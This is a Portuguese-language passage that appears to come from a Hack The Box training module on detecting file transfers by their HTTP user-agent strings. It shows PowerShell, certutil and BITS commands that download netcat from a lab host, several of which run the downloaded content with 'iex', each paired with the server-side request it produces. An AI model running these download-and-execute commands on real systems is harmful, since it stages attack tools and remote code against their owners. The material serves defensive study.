A detecção de comandos baseados em listas negras pode ser facilmente contornada com simples ofuscação, como a alteração de maiúsculas e minúsculas. No entanto, um processo de lista branca para todas as linhas de comando em um ambiente específico, embora demorado, é robusto e eficaz na detecção de comandos incomuns.

No contexto de protocolos cliente-servidor, como HTTP, o cliente e o servidor negociam como o conteúdo será entregue antes da troca de informações. Os clientes HTTP são identificados por sua string de agente de usuário, que os servidores usam para reconhecer o tipo de cliente que está se conectando, como navegadores ou ferramentas como cURL e Nmap.

Organizações podem identificar agentes de usuário legítimos e filtrar o tráfego para focar em anomalias que indiquem comportamento suspeito. Agentes de usuário suspeitos podem ser investigados para determinar se foram usados de forma maliciosa. Além disso, transferências de arquivos maliciosas podem ser detectadas por seus agentes de usuário específicos.

#### Invoke-WebRequest - Cliente
```powershell-session
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe" 
PS C:\htb> Invoke-RestMethod http://10.10.10.32/nc.exe -OutFile "C:\Users\Public\nc.exe"
```

#### Invoke-WebRequest - Servidor
```shell-session
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.14393.0
```

#### WinHttpRequest - Cliente
```powershell-session
PS C:\htb> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.ResponseText
```

#### WinHttpRequest - Servidor
```shell-session
GET /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
```

#### Msxml2 - Cliente
```powershell-session
PS C:\htb> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\htb> $h.open('GET','http://10.10.10.32/nc.exe',$false);
PS C:\htb> $h.send();
PS C:\htb> iex $h.responseText
```

#### Msxml2 - Servidor
```shell-session
GET /nc.exe HTTP/1.1
Accept: */*
Accept-Language: en-us
UA-CPU: AMD64
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)
```

#### Certutil - Cliente
```cmd-session
C:\htb> certutil -urlcache -split -f http://10.10.10.32/nc.exe 
C:\htb> certutil -verifyctl -split -f http://10.10.10.32/nc.exe
```

#### Certutil - Servidor
```shell-session
GET /nc.exe HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Accept: */*
User-Agent: Microsoft-CryptoAPI/10.0
```

#### BITS - Cliente
```powershell-session
PS C:\htb> Import-Module bitstransfer;
PS C:\htb> Start-BitsTransfer 'http://10.10.10.32/nc.exe' $env:temp\t;
PS C:\htb> $r=gc $env:temp\t;
PS C:\htb> rm $env:temp\t; 
PS C:\htb> iex $r
```

#### BITS - Servidor
```shell-session
HEAD /nc.exe HTTP/1.1
Connection: Keep-Alive
Accept: */*
Accept-Encoding: identity
User-Agent: Microsoft BITS/7.8
```







